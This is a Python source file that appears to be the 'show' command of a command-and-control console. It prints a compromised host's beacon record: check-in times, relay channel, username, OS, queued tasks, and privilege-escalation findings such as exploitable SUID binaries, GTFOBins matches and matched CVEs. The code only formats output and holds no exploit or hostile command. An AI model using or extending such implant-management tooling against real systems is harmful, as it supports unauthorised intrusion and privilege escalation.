"""show — Beacon 详情"""


def run(disp, args):
    bid, _ = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon (use <beacon_id>)"
    rec = disp.mgr.get_client(bid)
    if not rec:
        return f"[!] beacon not found: {bid}"
    via = f"via {rec.via}" if rec.via else "直连"
    fork = "是 (fork 分裂)" if getattr(rec, "is_fork", False) else "否"
    tag = ",".join(getattr(rec, "tags", [])) or "(无)"
    # 提权检测回填(priv_esc_parse, 2026-09-04 B12)——有值才显示
    esc_lines = []
    pn = getattr(rec, "priv_suid_n", None)
    pgn = getattr(rec, "priv_suid_gtfobins_n", None)
    if pn is not None:
        esc_lines.append(f"    可提权 SUID: {pn} 个"
                         + (f"({pgn} 命中 gtfobins)" if pgn else ""))
    cve = getattr(rec, "priv_cve_list", "") or ""
    if cve:
        esc_lines.append(f"    命中 CVE: {cve}")
    kern = getattr(rec, "kernel_version", "") or ""
    distro = getattr(rec, "sys_distro", "") or ""
    if kern or distro:
        esc_lines.append(f"    内核/发行版: {kern} / {distro}")
    return (
        f"[*] {rec.client_id}\n"
        f"    首次上线: {rec.first_seen.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"    最近回连: {rec.last_seen.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"    类型: {'Client' if rec.is_client else 'Beacon'}\n"
        f"    通道: {via}\n"
        f"    是否 fork: {fork}\n"
        f"    标签: {tag}\n"
        f"    操作系统: {rec.sys_platform or '(未获取)'}\n"
        f"    用户名: {rec.sys_user or '(未获取)'}\n"
        f"    系统版本: {rec.sys_os or '(未获取)'}\n"
        + ("".join(x + "\n" for x in esc_lines) if esc_lines else "")
        + f"    待执行任务: {disp.tq.pending_count(bid)}\n"
        f"    已完成结果: {len(rec.results)}"
    )
